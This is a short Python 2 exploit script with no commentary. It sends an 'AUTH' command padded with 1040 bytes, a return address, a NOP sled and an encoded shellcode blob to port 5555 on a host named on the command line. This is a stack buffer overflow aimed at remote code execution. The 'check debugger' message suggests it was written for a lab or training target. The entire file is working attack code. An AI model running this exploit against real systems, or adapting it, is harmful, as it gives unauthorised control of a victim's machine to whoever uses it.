#!/usr/bin/python
import time, struct, sys
import socket as so

shellcode = ("\xda\xdd\xd9\x74\x24\xf4\xbe\xd8\x2e\x9d\xc6\x5b\x29\xc9\xb1"
"\x52\x83\xeb\xfc\x31\x73\x13\x03\xab\x3d\x7f\x33\xb7\xaa\xfd"
"\xbc\x47\x2b\x62\x34\xa2\x1a\xa2\x22\xa7\x0d\x12\x20\xe5\xa1"
"\xd9\x64\x1d\x31\xaf\xa0\x12\xf2\x1a\x97\x1d\x03\x36\xeb\x3c"
"\x87\x45\x38\x9e\xb6\x85\x4d\xdf\xff\xf8\xbc\x8d\xa8\x77\x12"
"\x21\xdc\xc2\xaf\xca\xae\xc3\xb7\x2f\x66\xe5\x96\xfe\xfc\xbc"
"\x38\x01\xd0\xb4\x70\x19\x35\xf0\xcb\x92\x8d\x8e\xcd\x72\xdc"
"\x6f\x61\xbb\xd0\x9d\x7b\xfc\xd7\x7d\x0e\xf4\x2b\x03\x09\xc3"
"\x56\xdf\x9c\xd7\xf1\x94\x07\x33\x03\x78\xd1\xb0\x0f\x35\x95"
"\x9e\x13\xc8\x7a\x95\x28\x41\x7d\x79\xb9\x11\x5a\x5d\xe1\xc2"
"\xc3\xc4\x4f\xa4\xfc\x16\x30\x19\x59\x5d\xdd\x4e\xd0\x3c\x8a"
"\xa3\xd9\xbe\x4a\xac\x6a\xcd\x78\x73\xc1\x59\x31\xfc\xcf\x9e"
"\x36\xd7\xa8\x30\xc9\xd8\xc8\x19\x0e\x8c\x98\x31\xa7\xad\x72"
"\xc1\x48\x78\xd4\x91\xe6\xd3\x95\x41\x47\x84\x7d\x8b\x48\xfb"
"\x9e\xb4\x82\x94\x35\x4f\x45\x91\xc2\x4f\x2b\xcd\xd6\x4f\x52"
"\xb5\x5e\xa9\x3e\xd9\x36\x62\xd7\x40\x13\xf8\x46\x8c\x89\x85"
"\x49\x06\x3e\x7a\x07\xef\x4b\x68\xf0\x1f\x06\xd2\x57\x1f\xbc"
"\x7a\x3b\xb2\x5b\x7a\x32\xaf\xf3\x2d\x13\x01\x0a\xbb\x89\x38"
"\xa4\xd9\x53\xdc\x8f\x59\x88\x1d\x11\x60\x5d\x19\x35\x72\x9b"
"\xa2\x71\x26\x73\xf5\x2f\x90\x35\xaf\x81\x4a\xec\x1c\x48\x1a"
"\x69\x6f\x4b\x5c\x76\xba\x3d\x80\xc7\x13\x78\xbf\xe8\xf3\x8c"
"\xb8\x14\x64\x72\x13\x9d\x84\x91\xb1\xe8\x2c\x0c\x50\x51\x31"
"\xaf\x8f\x96\x4c\x2c\x25\x67\xab\x2c\x4c\x62\xf7\xea\xbd\x1e"
"\x68\x9f\xc1\x8d\x89\x8a")

try:
    server = sys.argv[1]
    port = 5555
except IndexError:
    print "[+] Usage %s host" % sys.argv[0]
    sys.exit()
req1 = "AUTH " + "\x41"*1040 + "\x71\x1d\xd1\x65" + "\x90"*16 + shellcode + "C"*(1072-1040-4-16)
s = so.socket(so.AF_INET, so.SOCK_STREAM)
try:
     s.connect((server, port))
     print repr(s.recv(1024))
     s.send(req1)
     print repr(s.recv(1024))
except:
     print "[!] connection refused, check debugger"
s.close()
